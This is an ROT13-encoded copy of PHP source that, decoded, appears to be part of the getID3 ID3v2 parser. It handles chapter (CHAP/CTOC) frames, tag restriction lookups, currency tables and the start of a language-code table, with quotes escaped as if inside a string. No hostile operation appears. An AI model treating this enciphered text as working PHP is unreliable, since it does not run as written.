								$fhosenzr['vzntr_zvzr']   = gevz(trgvq3_yvo::vpbai_snyyonpx($fhosenzr['rapbqvat'], $vasb['rapbqvat'], $fhosenzr_ncvp_zvzr));
								$fhosenzr['cvpgher_glcr'] = $guvf->NCVPCvpgherGlcrYbbxhc($fhosenzr_ncvp_cvpgherglcr);
								$fhosenzr['qrfpevcgvba']  = gevz(trgvq3_yvo::vpbai_snyyonpx($fhosenzr['rapbqvat'], $vasb['rapbqvat'], $fhosenzr_ncvp_qrfpevcgvba));
								vs (fgeyra($guvf->GrkgRapbqvatGrezvangbeYbbxhc($fhosenzr['rapbqvat'])) == 2) {
									// gur ahyy grezvangbe orgjrra \"qrfpevcgvba\" naq \"cvpgher qngn\" pbhyq or rvgure 1 olgr (VFB-8859-1, HGS-8) be gjb olgrf (HGS-16)
									// gur nobir ertrk nffhzrf bar olgr, vs vg'f npghnyyl gjb gura fgevc gur frpbaq bar urer
									$fhosenzr_ncvp_cvpgherqngn = fhofge($fhosenzr_ncvp_cvpgherqngn, 1);
								}
								$fhosenzr['qngn'] = $fhosenzr_ncvp_cvpgherqngn;
								hafrg($qhzzl, $fhosenzr_ncvp_zvzr, $fhosenzr_ncvp_cvpgherglcr, $fhosenzr_ncvp_qrfpevcgvba, $fhosenzr_ncvp_cvpgherqngn);
								hafrg($fhosenzr['grkg'], $cnefrqSenzr['grkg']);
								$cnefrqSenzr['fhosenzrf'][] = $fhosenzr;
								$cnefrqSenzr['cvpgher_cerfrag'] = gehr;
							} ryfr {
								$guvf->jneavat('VQ3i2.PUNC fhosenzr #'.(pbhag($cnefrqSenzr['fhosenzrf']) + 1).' \"'.$fhosenzr['anzr'].'\" abg va rkcrpgrq sbezng');
							}
							oernx;
						qrsnhyg:
							$guvf->jneavat('VQ3i2.PUNC fhosenzr \"'.$fhosenzr['anzr'].'\" abg unaqyrq (fhccbegrq: GVG2, GVG3, JKKK, NCVP)');
							oernx;
					}
				}
				hafrg($fhosenzr_enjqngn, $fhosenzr, $rapbqvat_pbairegrq_grkg);
				hafrg($cnefrqSenzr['qngn']); // qrongnoyr jurgure guvf guvf or urer, jvgubhg vg gur erghearq fgehpgher znl pbagnva n ynetr nzbhag bs qhcyvpngr qngn vs puncgref pbagnva NCVP
			}

			$vq3i2_puncgre_ragel = neenl();
			sbernpu (neenl('vq', 'gvzr_ortva', 'gvzr_raq', 'bssfrg_ortva', 'bssfrg_raq', 'puncgre_anzr', 'puncgre_qrfpevcgvba', 'puncgre_hey', 'cvpgher_cerfrag') nf $vq3i2_puncgre_xrl) {
				vs (vffrg($cnefrqSenzr[$vq3i2_puncgre_xrl])) {
					$vq3i2_puncgre_ragel[$vq3i2_puncgre_xrl] = $cnefrqSenzr[$vq3i2_puncgre_xrl];
				}
			}
			vs (!vffrg($vasb['vq3i2']['puncgref'])) {
				$vasb['vq3i2']['puncgref'] = neenl();
			}
			$vasb['vq3i2']['puncgref'][] = $vq3i2_puncgre_ragel;
			hafrg($vq3i2_puncgre_ragel, $vq3i2_puncgre_xrl);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'PGBP')) { // PGBP Puncgref Gnoyr Bs Pbagragf senzr (VQ3i2.3+ bayl)
			// uggc://vq3.bet/vq3i2-puncgref-1.0
			// <VQ3i2.3 be VQ3i2.4 senzr urnqre, VQ: \"PGBP\">           (10 olgrf)
			// Ryrzrag VQ      <grkg fgevat> $00
			// PGBP syntf        %kk
			// Ragel pbhag       $kk
			// Puvyq Ryrzrag VQ  <fgevat>$00   /* mreb be zber puvyq PUNC be PGBP ragevrf */
			// <Bcgvbany rzorqqrq fho-senzrf>

			$senzr_bssfrg = 0;
			@yvfg($cnefrqSenzr['ryrzrag_vq']) = rkcybqr(\"\k00\", $cnefrqSenzr['qngn'], 2);
			$senzr_bssfrg += fgeyra($cnefrqSenzr['ryrzrag_vq'].\"\k00\");
			$pgbp_syntf_enj = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 1));
			$senzr_bssfrg += 1;
			$cnefrqSenzr['ragel_pbhag'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 1));
			$senzr_bssfrg += 1;

			$grezvangbe_cbfvgvba = ahyy;
			sbe ($v = 0; $v < $cnefrqSenzr['ragel_pbhag']; $v++) {
				$grezvangbe_cbfvgvba = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
				$cnefrqSenzr['puvyq_ryrzrag_vqf'][$v] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $grezvangbe_cbfvgvba - $senzr_bssfrg);
				$senzr_bssfrg = $grezvangbe_cbfvgvba + 1;
			}

			$cnefrqSenzr['pgbp_syntf']['beqrerq']   = (obby) ($pgbp_syntf_enj & 0k01);
			$cnefrqSenzr['pgbp_syntf']['gbc_yriry'] = (obby) ($pgbp_syntf_enj & 0k03);

			hafrg($pgbp_syntf_enj, $grezvangbe_cbfvgvba);

			vs ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
				$cnefrqSenzr['fhosenzrf'] = neenl();
				juvyr ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
					// <Bcgvbany rzorqqrq fho-senzrf>
					$fhosenzr = neenl();
					$fhosenzr['anzr']      =                           fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4);
					$senzr_bssfrg += 4;
					$fhosenzr['fvmr']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
					$senzr_bssfrg += 4;
					$fhosenzr['syntf_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
					$senzr_bssfrg += 2;
					vs ($fhosenzr['fvmr'] > (fgeyra($cnefrqSenzr['qngn']) - $senzr_bssfrg)) {
						$guvf->jneavat('PGBF fhosenzr \"'.$fhosenzr['anzr'].'\" ng senzr bssfrg '.$senzr_bssfrg.' pynvzf gb or \"'.$fhosenzr['fvmr'].'\" olgrf, juvpu vf zber guna gur ninvynoyr qngn ('.(fgeyra($cnefrqSenzr['qngn']) - $senzr_bssfrg).' olgrf)');
						oernx;
					}
					$fhosenzr_enjqngn = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $fhosenzr['fvmr']);
					$senzr_bssfrg += $fhosenzr['fvmr'];

					$fhosenzr['rapbqvatvq'] = beq(fhofge($fhosenzr_enjqngn, 0, 1));
					$fhosenzr['grkg']       =     fhofge($fhosenzr_enjqngn, 1);
					$fhosenzr['rapbqvat']   = $guvf->GrkgRapbqvatAnzrYbbxhc($fhosenzr['rapbqvatvq']);
					$rapbqvat_pbairegrq_grkg = gevz(trgvq3_yvo::vpbai_snyyonpx($fhosenzr['rapbqvat'], $vasb['rapbqvat'], $fhosenzr['grkg']));;
					fjvgpu (fhofge($rapbqvat_pbairegrq_grkg, 0, 2)) {
						pnfr \"\kSS\kSR\":
						pnfr \"\kSR\kSS\":
							fjvgpu (fgegbhccre($vasb['vq3i2']['rapbqvat'])) {
								pnfr 'VFB-8859-1':
								pnfr 'HGS-8':
									$rapbqvat_pbairegrq_grkg = fhofge($rapbqvat_pbairegrq_grkg, 2);
									// erzbir hajnagrq olgr-beqre-znexf
									oernx;
								qrsnhyg:
									// vtaber
									oernx;
							}
							oernx;
						qrsnhyg:
							// qb abg erzbir OBZ
							oernx;
					}

					vs (($fhosenzr['anzr'] == 'GVG2') || ($fhosenzr['anzr'] == 'GVG3')) {
						vs ($fhosenzr['anzr'] == 'GVG2') {
							$cnefrqSenzr['gbp_anzr']        = $rapbqvat_pbairegrq_grkg;
						} ryfrvs ($fhosenzr['anzr'] == 'GVG3') {
							$cnefrqSenzr['gbp_qrfpevcgvba'] = $rapbqvat_pbairegrq_grkg;
						}
						$cnefrqSenzr['fhosenzrf'][] = $fhosenzr;
					} ryfr {
						$guvf->jneavat('VQ3i2.PGBP fhosenzr \"'.$fhosenzr['anzr'].'\" abg unaqyrq (bayl GVG2 naq GVG3)');
					}
				}
				hafrg($fhosenzr_enjqngn, $fhosenzr, $rapbqvat_pbairegrq_grkg);
			}

		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $qngn
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba QrHaflapuebavfr($qngn) {
		erghea fge_ercynpr(\"\kSS\k00\", \"\kSS\", $qngn);
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcRkgraqrqUrnqreErfgevpgvbafGntFvmrYvzvgf($vaqrk) {
		fgngvp $YbbxhcRkgraqrqUrnqreErfgevpgvbafGntFvmrYvzvgf = neenl(
			0k00 => 'Ab zber guna 128 senzrf naq 1 ZO gbgny gnt fvmr',
			0k01 => 'Ab zber guna 64 senzrf naq 128 XO gbgny gnt fvmr',
			0k02 => 'Ab zber guna 32 senzrf naq 40 XO gbgny gnt fvmr',
			0k03 => 'Ab zber guna 32 senzrf naq 4 XO gbgny gnt fvmr',
		);
		erghea (vffrg($YbbxhcRkgraqrqUrnqreErfgevpgvbafGntFvmrYvzvgf[$vaqrk]) ? $YbbxhcRkgraqrqUrnqreErfgevpgvbafGntFvmrYvzvgf[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgRapbqvatf($vaqrk) {
		fgngvp $YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgRapbqvatf = neenl(
			0k00 => 'Ab erfgevpgvbaf',
			0k01 => 'Fgevatf ner bayl rapbqrq jvgu VFB-8859-1 be HGS-8',
		);
		erghea (vffrg($YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgRapbqvatf[$vaqrk]) ? $YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgRapbqvatf[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgSvryqFvmr($vaqrk) {
		fgngvp $YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgSvryqFvmr = neenl(
			0k00 => 'Ab erfgevpgvbaf',
			0k01 => 'Ab fgevat vf ybatre guna 1024 punenpgref',
			0k02 => 'Ab fgevat vf ybatre guna 128 punenpgref',
			0k03 => 'Ab fgevat vf ybatre guna 30 punenpgref',
		);
		erghea (vffrg($YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgSvryqFvmr[$vaqrk]) ? $YbbxhcRkgraqrqUrnqreErfgevpgvbafGrkgSvryqFvmr[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrRapbqvat($vaqrk) {
		fgngvp $YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrRapbqvat = neenl(
			0k00 => 'Ab erfgevpgvbaf',
			0k01 => 'Vzntrf ner rapbqrq bayl jvgu CAT be WCRT',
		);
		erghea (vffrg($YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrRapbqvat[$vaqrk]) ? $YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrRapbqvat[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrFvmrFvmr($vaqrk) {
		fgngvp $YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrFvmrFvmr = neenl(
			0k00 => 'Ab erfgevpgvbaf',
			0k01 => 'Nyy vzntrf ner 256k256 cvkryf be fznyyre',
			0k02 => 'Nyy vzntrf ner 64k64 cvkryf be fznyyre',
			0k03 => 'Nyy vzntrf ner rknpgyl 64k64 cvkryf, hayrff erdhverq bgurejvfr',
		);
		erghea (vffrg($YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrFvmrFvmr[$vaqrk]) ? $YbbxhcRkgraqrqUrnqreErfgevpgvbafVzntrFvmrFvmr[$vaqrk] : '');
	}

	/**
	 * @cnenz fgevat $pheeraplvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcPheeraplHavgf($pheeraplvq) {

		$ortva = __YVAR__;

		/** Guvf vf abg n pbzzrag!


			NRQ	Qveunzf
			NSN	Nstunavf
			NYY	Yrxr
			NZQ	Qenzf
			NAT	Thvyqref
			NBN	Xjnamn
			NEF	Crfbf
			NGF	Fpuvyyvatf
			NHQ	Qbyynef
			NJT	Thvyqref
			NMZ	Znangf
			ONZ	Pbairegvoyr Znexn
			OOQ	Qbyynef
			OQG	Gnxn
			ORS	Senapf
			OTY	Yrin
			OUQ	Qvanef
			OVS	Senapf
			OZQ	Qbyynef
			OAQ	Qbyynef
			OBO	Obyvivnabf
			OEY	Oenmvy Erny
			OFQ	Qbyynef
			OGA	Athygehz
			OJC	Chynf
			OLE	Ehoyrf
			OMQ	Qbyynef
			PNQ	Qbyynef
			PQS	Pbatbyrfr Senapf
			PUS	Senapf
			PYC	Crfbf
			PAL	Lhna Erazvaov
			PBC	Crfbf
			PEP	Pbybarf
			PHC	Crfbf
			PIR	Rfphqbf
			PLC	Cbhaqf
			PMX	Xbehal
			QRZ	Qrhgfpur Znexf
			QWS	Senapf
			QXX	Xebare
			QBC	Crfbf
			QMQ	Nytrevn Qvanef
			RRX	Xebbav
			RTC	Cbhaqf
			REA	Anxsn
			RFC	Crfrgnf
			RGO	Ovee
			RHE	Rheb
			SVZ	Znexxnn
			SWQ	Qbyynef
			SXC	Cbhaqf
			SES	Senapf
			TOC	Cbhaqf
			TRY	Ynev
			TTC	Cbhaqf
			TUP	Prqvf
			TVC	Cbhaqf
			TZQ	Qnynfv
			TAS	Senapf
			TEQ	Qenpuznr
			TGD	Dhrgmnyrf
			TLQ	Qbyynef
			UXQ	Qbyynef
			UAY	Yrzcvenf
			UEX	Xhan
			UGT	Tbheqrf
			UHS	Sbevagf
			VQE	Ehcvnuf
			VRC	Cbhaqf
			VYF	Arj Furxryf
			VZC	Cbhaqf
			VAE	Ehcrrf
			VDQ	Qvanef
			VEE	Evnyf
			VFX	Xebahe
			VGY	Yver
			WRC	Cbhaqf
			WZQ	Qbyynef
			WBQ	Qvanef
			WCL	Lra
			XRF	Fuvyyvatf
			XTF	Fbzf
			XUE	Evryf
			XZS	Senapf
			XCJ	Jba
			XJQ	Qvanef
			XLQ	Qbyynef
			XMG	Gratr
			YNX	Xvcf
			YOC	Cbhaqf
			YXE	Ehcrrf
			YEQ	Qbyynef
			YFY	Znybgv
			YGY	Yvgnv
			YHS	Senapf
			YIY	Yngv
			YLQ	Qvanef
			ZNQ	Qveunzf
			ZQY	Yrv
			ZTS	Znyntnfl Senapf
			ZXQ	Qranef
			ZZX	Xlngf
			ZAG	Ghtevxf
			ZBC	Cngnpnf
			ZEB	Bhthvlnf
			ZGY	Yvev
			ZHE	Ehcrrf
			ZIE	Ehsvlnn
			ZJX	Xjnpunf
			ZKA	Crfbf
			ZLE	Evattvgf
			ZMZ	Zrgvpnvf
			ANQ	Qbyynef
			ATA	Anvenf
			AVB	Tbyq Pbeqbonf
			AYT	Thvyqref
			ABX	Xebar
			ACE	Arcny Ehcrrf
			AMQ	Qbyynef
			BZE	Evnyf
			CNO	Onyobn
			CRA	Ahribf Fbyrf
			CTX	Xvan
			CUC	Crfbf
			CXE	Ehcrrf
			CYA	Mybglpu
			CGR	Rfphqbf
			CLT	Thnenav
			DNE	Evnyf
			EBY	Yrv
			EHE	Ehoyrf
			EJS	Ejnaqn Senapf
			FNE	Evlnyf
			FOQ	Qbyynef
			FPE	Ehcrrf
			FQQ	Qvanef
			FRX	Xebabe
			FTQ	Qbyynef
			FUC	Cbhaqf
			FVG	Gbynef
			FXX	Xbehal
			FYY	Yrbarf
			FBF	Fuvyyvatf
			FCY	Yhvtvav
			FET	Thvyqref
			FGQ	Qboenf
			FIP	Pbybarf
			FLC	Cbhaqf
			FMY	Rznynatrav
			GUO	Onug
			GWE	Ehoyrf
			GZZ	Znangf
			GAQ	Qvanef
			GBC	Cn'natn
			GEY	Yvenf (byq)
			GEL	Yvenf
			GGQ	Qbyynef
			GIQ	Ghinyh Qbyynef
			GJQ	Arj Qbyynef
			GMF	Fuvyyvatf
			HNU	Ueliavn
			HTK	Fuvyyvatf
			HFQ	Qbyynef
			HLH	Crfbf
			HMF	Fhzf
			INY	Yver
			IRO	Obyvinerf
			IAQ	Qbat
			IHI	Ingh
			JFG	Gnyn
			KNS	Senapf
			KNT	Bhaprf
			KNH	Bhaprf
			KPQ	Qbyynef
			KQE	Fcrpvny Qenjvat Evtugf
			KCQ	Bhaprf
			KCS	Senapf
			KCG	Bhaprf
			LRE	Evnyf
			LHZ	Arj Qvanef
			MNE	Enaq
			MZX	Xjnpun
			MJQ	Mvzonojr Qbyynef

		*/

		erghea trgvq3_yvo::RzorqqrqYbbxhc($pheeraplvq, $ortva, __YVAR__, __SVYR__, 'vq3i2-pheerapl-havgf');
	}

	/**
	 * @cnenz fgevat $pheeraplvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba YbbxhcPheeraplPbhagel($pheeraplvq) {

		$ortva = __YVAR__;

		/** Guvf vf abg n pbzzrag!

			NRQ	Havgrq Neno Rzvengrf
			NSN	Nstunavfgna
			NYY	Nyonavn
			NZQ	Nezravn
			NAT	Argureynaqf Nagvyyrf
			NBN	Natbyn
			NEF	Netragvan
			NGF	Nhfgevn
			NHQ	Nhfgenyvn
			NJT	Nehon
			NMZ	Nmreonvwna
			ONZ	Obfavn naq Uremrtbivan
			OOQ	Oneonqbf
			OQG	Onatynqrfu
			ORS	Orytvhz
			OTY	Ohytnevn
			OUQ	Onuenva
			OVS	Ohehaqv
			OZQ	Orezhqn
			OAQ	Oeharv Qnehffnynz
			OBO	Obyvivn
			OEY	Oenmvy
			OFQ	Onunznf
			OGA	Ouhgna
			OJC	Obgfjnan
			OLE	Orynehf
			OMQ	Oryvmr
			PNQ	Pnanqn
			PQS	Pbatb/Xvafunfn
			PUS	Fjvgmreynaq
			PYC	Puvyr
			PAL	Puvan
			PBC	Pbybzovn
			PEP	Pbfgn Evpn
			PHC	Phon
			PIR	Pncr Ireqr
			PLC	Plcehf
			PMX	Pmrpu Erchoyvp
			QRZ	Treznal
			QWS	Qwvobhgv
			QXX	Qraznex
			QBC	Qbzvavpna Erchoyvp
			QMQ	Nytrevn
			RRX	Rfgbavn
			RTC	Rtlcg
			REA	Revgern
			RFC	Fcnva
			RGO	Rguvbcvn
			RHE	Rheb Zrzore Pbhagevrf
			SVZ	Svaynaq
			SWQ	Svwv
			SXC	Snyxynaq Vfynaqf (Znyivanf)
			SES	Senapr
			TOC	Havgrq Xvatqbz
			TRY	Trbetvn
			TTC	Threafrl
			TUP	Tunan
			TVC	Tvoenygne
			TZQ	Tnzovn
			TAS	Thvarn
			TEQ	Terrpr
			TGD	Thngrznyn
			TLQ	Thlnan
			UXQ	Ubat Xbat
			UAY	Ubaqhenf
			UEX	Pebngvn
			UGT	Unvgv
			UHS	Uhatnel
			VQE	Vaqbarfvn
			VRC	Verynaq (Rver)
			VYF	Vfenry
			VZC	Vfyr bs Zna
			VAE	Vaqvn
			VDQ	Vend
			VEE	Vena
			VFX	Vprynaq
			VGY	Vgnyl
			WRC	Wrefrl
			WZQ	Wnznvpn
			WBQ	Wbeqna
			WCL	Wncna
			XRF	Xraln
			XTF	Xletlmfgna
			XUE	Pnzobqvn
			XZS	Pbzbebf
			XCJ	Xbern
			XJQ	Xhjnvg
			XLQ	Pnlzna Vfynaqf
			XMG	Xnmnxfgna
			YNX	Ynbf
			YOC	Yronaba
			YXE	Fev Ynaxn
			YEQ	Yvorevn
			YFY	Yrfbgub
			YGY	Yvguhnavn
			YHS	Yhkrzobhet
			YIY	Yngivn
			YLQ	Yvoln
			ZNQ	Zbebppb
			ZQY	Zbyqbin
			ZTS	Znqntnfpne
			ZXQ	Znprqbavn
			ZZX	Zlnazne (Ohezn)
			ZAG	Zbatbyvn
			ZBC	Znpnh
			ZEB	Znhevgnavn
			ZGY	Znygn
			ZHE	Znhevgvhf
			ZIE	Znyqvirf (Znyqvir Vfynaqf)
			ZJX	Znynjv
			ZKA	Zrkvpb
			ZLE	Znynlfvn
			ZMZ	Zbmnzovdhr
			ANQ	Anzvovn
			ATA	Avtrevn
			AVB	Avpnenthn
			AYT	Argureynaqf (Ubyynaq)
			ABX	Abejnl
			ACE	Arcny
			AMQ	Arj Mrnynaq
			BZE	Bzna
			CNO	Cnanzn
			CRA	Creh
			CTX	Cnchn Arj Thvarn
			CUC	Cuvyvccvarf
			CXE	Cnxvfgna
			CYA	Cbynaq
			CGR	Cbeghtny
			CLT	Cnenthnl
			DNE	Dngne
			EBY	Ebznavn
			EHE	Ehffvn
			EJS	Ejnaqn
			FNE	Fnhqv Nenovn
			FOQ	Fbybzba Vfynaqf
			FPE	Frlpuryyrf
			FQQ	Fhqna
			FRX	Fjrqra
			FTQ	Fvatncber
			FUC	Fnvag Uryran
			FVG	Fybiravn
			FXX	Fybinxvn
			FYY	Fvreen Yrbar
			FBF	Fbznyvn
			FCY	Frobetn
			FET	Fhevanzr
			FGQ	Fãb Gbzr naq Cevapvcr
			FIP	Ry Fnyinqbe
			FLC	Flevn
			FMY	Fjnmvynaq
			GUO	Gunvynaq
			GWE	Gnwvxvfgna
			GZZ	Ghexzravfgna
			GAQ	Ghavfvn
			GBC	Gbatn
			GEY	Ghexrl
			GEL	Ghexrl
			GGQ	Gevavqnq naq Gbontb
			GIQ	Ghinyh
			GJQ	Gnvjna
			GMF	Gnamnavn
			HNU	Hxenvar
			HTK	Htnaqn
			HFQ	Havgrq Fgngrf bs Nzrevpn
			HLH	Hehthnl
			HMF	Hmorxvfgna
			INY	Ingvpna Pvgl
			IRO	Irarmhryn
			IAQ	Ivrg Anz
			IHI	Inahngh
			JFG	Fnzbn
			KNS	Pbzzhanhgé Svanapvèer Nsevpnvar
			KNT	Fvyire
			KNH	Tbyq
			KPQ	Rnfg Pnevoorna
			KQE	Vagreangvbany Zbargnel Shaq
			KCQ	Cnyynqvhz
			KCS	Pbzcgbvef Senaçnvf qh Cnpvsvdhr
			KCG	Cyngvahz
			LRE	Lrzra
			LHZ	Lhtbfynivn
			MNE	Fbhgu Nsevpn
			MZX	Mnzovn
			MJQ	Mvzonojr

		*/

		erghea trgvq3_yvo::RzorqqrqYbbxhc($pheeraplvq, $ortva, __YVAR__, __SVYR__, 'vq3i2-pheerapl-pbhagel');
	}

	/**
	 * @cnenz fgevat $ynathntrpbqr
	 * @cnenz obby   $pnfrfrafvgvir
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YnathntrYbbxhc($ynathntrpbqr, $pnfrfrafvgvir=snyfr) {

		vs (!$pnfrfrafvgvir) {
			$ynathntrpbqr = fgegbybjre($ynathntrpbqr);
		}

		// uggc://jjj.vq3.bet/vq3i2.4.0-fgehpgher.gkg
		// [4.   VQ3i2 senzr bireivrj]
		// Gur guerr olgr ynathntr svryq, cerfrag va frireny senzrf, vf hfrq gb
		// qrfpevor gur ynathntr bs gur senzr'f pbagrag, nppbeqvat gb VFB-639-2
		// [VFB-639-2]. Gur ynathntr fubhyq or ercerfragrq va ybjre pnfr. Vs gur
		// ynathntr vf abg xabja gur fgevat \"KKK\" fubhyq or hfrq.


		// VFB 639-2 - uggc://jjj.vq3.bet/vfb639-2.ugzy

		$ortva = __YVAR__;

		/** Guvf vf abg n pbzzrag!

			KKK	haxabja
			kkk	haxabja
			nne	Nsne
			nox	Noxunmvna
			npr	Npuvarfr
			npu	Npbyv
			nqn	Nqnatzr
			nsn	Nseb-Nfvngvp (Bgure)
			nsu	Nsevuvyv
			nse	Nsevxnnaf
			nxn	Nxna
			nxx	Nxxnqvna
			nyo	Nyonavna
			nyr	Nyrhg
			nyt	Nytbadhvna Ynathntrf
			nzu	Nzunevp
			nat	Ratyvfu, Byq (pn. 450-1100)
			ncn	Ncnpur Ynathntrf
			nen	Nenovp
			nep	Nenznvp
			nez	Nezravna
			nea	Nenhpnavna
			nec	Nencnub
			neg	Negvsvpvny (Bgure)
			nej	Nenjnx
			nfz	Nffnzrfr
			ngu	Nguncnfpna Ynathntrf
			nin	Ninevp
			nir	Nirfgna
			njn	Njnquv
			nlz	Nlznen
			nmr	Nmreonvwnav
			onq	Onaqn
			onv	Onzvyrxr Ynathntrf
			onx	Onfuxve
			ony	Onyhpuv
			onz	Onzonen
			ona	Onyvarfr
			ond	Onfdhr
			onf	Onfn
			ong	Onygvp (Bgure)
			orw	Orwn
			ory	Olrybehffvna
			orz	Orzon
			ora	Oratnyv
			ore	Oreore (Bgure)
			oub	Oubwchev
			ovu	Ovunev
			ovx	Ovxby
			ova	Ovav
			ovf	Ovfynzn
			oyn	Fvxfvxn
			oag	Onagh (Bgure)
			obq	Gvorgna
			oen	Oenw
			oer	Oergba
			ohn	Ohevng
			oht	Ohtvarfr
			ohy	Ohytnevna
			ohe	Ohezrfr
			pnq	Pnqqb
			pnv	Prageny Nzrevpna Vaqvna (Bgure)
			pne	Pnevo
			png	Pngnyna
			pnh	Pnhpnfvna (Bgure)
			pro	Prohnab
			pry	Prygvp (Bgure)
			prf	Pmrpu
			pun	Punzbeeb
			puo	Puvopun
			pur	Purpura
			put	Puntngnv
			puv	Puvarfr
			puz	Znev
			pua	Puvabbx wnetba
			pub	Pubpgnj
			pue	Purebxrr
			puh	Puhepu Fynivp
			pui	Puhinfu
			pul	Purlraar
			pbc	Pbcgvp
			pbe	Pbeavfu
			pbf	Pbefvpna
			pcr	Perbyrf naq Cvqtvaf, Ratyvfu-onfrq (Bgure)
			pcs	Perbyrf naq Cvqtvaf, Serapu-onfrq (Bgure)
			pcc	Perbyrf naq Cvqtvaf, Cbeghthrfr-onfrq (Bgure)
			per	Perr
			pec	Perbyrf naq Cvqtvaf (Bgure)
			phf	Phfuvgvp (Bgure)
			plz	Jryfu
			pmr	Pmrpu
			qnx	Qnxbgn
			qna	Qnavfu
			qry	Qrynjner
			qrh	Trezna
			qva	Qvaxn
			qvi	Qviruv
			qbv	Qbtev
			qen	Qenivqvna (Bgure)
			qhn	Qhnyn
			qhz	Qhgpu, Zvqqyr (pn. 1050-1350)
			qhg	Qhgpu
			qlh	Qlhyn
			qmb	Qmbatxun
			rsv	Rsvx
			rtl	Rtlcgvna (Napvrag)
			rxn	Rxnwhx
			ryy	Terrx, Zbqrea (1453-)
			ryk	Rynzvgr
			rat	Ratyvfu
			raz	Ratyvfu, Zvqqyr (pn. 1100-1500)
			rcb	Rfcrenagb
			rfx	Rfxvzb (Bgure)
			rfy	Fcnavfu
			rfg	Rfgbavna
			rhf	Onfdhr
			rjr	Rjr
			rjb	Rjbaqb
			sna	Snat
			snb	Snebrfr
			snf	Crefvna
			sng	Snagv
			svw	Svwvna
			sva	Svaavfu
			svh	Svaab-Htevna (Bgure)
			sba	Sba
			sen	Serapu
			ser	Serapu
			sez	Serapu, Zvqqyr (pn. 1400-1600)
			seb	Serapu, Byq (842- pn. 1400)
			sel	Sevfvna
			shy	Shynu
			tnn	Tn
			tnr	Tnryvp (Fpbgf)
			tnv	Vevfu
			tnl	Tnlb
			tqu	Tnryvp (Fpbgf)
			trz	Treznavp (Bgure)
			trb	Trbetvna
			tre	Trezna
			trm	Trrm
			tvy	Tvyoregrfr
			tyt	Tnyyrtna
			tzu	Trezna, Zvqqyr Uvtu (pn. 1050-1500)
			tbu	Trezna, Byq Uvtu (pn. 750-1050)
			tba	Tbaqv
			tbg	Tbguvp
			teo	Terob
			tep	Terrx, Napvrag (gb 1453)
			ter	Terrx, Zbqrea (1453-)
			tea	Thnenav
			thw	Thwnengv
			unv	Unvqn
			unh	Unhfn
			unj	Unjnvvna
			uro	Uroerj
			ure	Urereb
			uvy	Uvyvtnlaba
			uvz	Uvznpunyv
			uva	Uvaqv
			uzb	Uvev Zbgh
			uha	Uhatnevna
			uhc	Uhcn
			ulr	Nezravna
			von	Vona
			vob	Vtob
			vpr	Vprynaqvp
			vwb	Vwb
			vxh	Vahxgvghg
			vyb	Vybxb
			van	Vagreyvathn (Vagreangvbany Nhkvyvnel ynathntr Nffbpvngvba)
			vap	Vaqvp (Bgure)
			vaq	Vaqbarfvna
			var	Vaqb-Rhebcrna (Bgure)
			var	Vagreyvathr
			vcx	Vahcvnx
			ven	Venavna (Bgure)
			vev	Vevfu
			veb	Vebdhbvna hntrf
			vfy	Vprynaqvp
			vgn	Vgnyvna
			wni	Wninarfr
			wnj	Wninarfr
			wca	Wncnarfr
			wce	Whqrb-Crefvna
			weo	Whqrb-Nenovp
			xnn	Xnen-Xnycnx
			xno	Xnolyr
			xnp	Xnpuva
			xny	Terraynaqvp
			xnz	Xnzon
			xna	Xnaanqn
			xne	Xnera
			xnf	Xnfuzvev
			xng	Trbetvna
			xnh	Xnahev
			xnj	Xnjv
			xnm	Xnmnxu
			xun	Xunfv
			xuv	Xubvfna (Bgure)
			xuz	Xuzre
			xub	Xubgnarfr
			xvx	Xvxhlh
			xva	Xvalnejnaqn
			xve	Xvetuvm
			xbx	Xbaxnav
			xbz	Xbzv
			xba	Xbatb
			xbe	Xberna
			xcr	Xcryyr
			xeb	Xeh
			xeh	Xhehxu
			xhn	Xhnalnzn
			xhz	Xhzlx
			xhe	Xheqvfu
			xhf	Xhfnvr
			xhg	Xhgranv
			ynq	Ynqvab
			ynu	Ynuaqn
			ynz	Ynzon
			ynb	Ynb
			yng	Yngva
			yni	Yngivna
			yrm	Yrmtuvna
